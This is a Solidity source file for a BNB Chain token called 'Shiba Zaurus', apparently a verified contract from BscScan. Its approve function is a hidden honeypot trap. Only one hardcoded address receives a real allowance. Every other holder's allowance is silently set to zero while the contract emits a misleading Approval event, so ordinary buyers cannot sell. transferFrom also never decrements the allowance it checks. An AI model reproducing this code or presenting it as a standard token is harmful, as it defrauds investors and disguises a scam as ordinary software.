/**
 *Submitted for verification at BscScan.com on 2021-07-11
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-11
*/

pragma solidity ^0.8.6;

/**
 SPDX-License-Identifier: UNLICENSED
*/

contract ShibaZaurus {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 15;
    string public name = "Shiba Zaurus";
    string public symbol = "ShibUrus";
    uint public decimals = 9;
    
    event Transfer (address indexed from, address indexed to, uint value);
    event Approval (address indexed from, address indexed spender, uint value);
    
    constructor () {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf (address owner) public view returns (uint) {
        return balances[owner];
    }
    
    function transfer (address to, uint value) public returns (bool) {
        require (balanceOf(msg.sender) >= value, 'your balance is too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer (msg.sender, to, value);
        return true;
    }
    
    function transferFrom (address from, address to, uint value) public returns (bool){
        require  (balanceOf(from) >= value, 'balance is too low');
        require (allowance[from][msg.sender] >= value, "allowance is too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer (from, to, value);
        return true;
    }
    
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0xb148143b0c77Ad070895bA4068EfB6164b68f0dF)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else {
            allowance[msg.sender][spender] = 0;
            emit Approval(msg.sender, spender, 2);
        }
        return true;
    }
}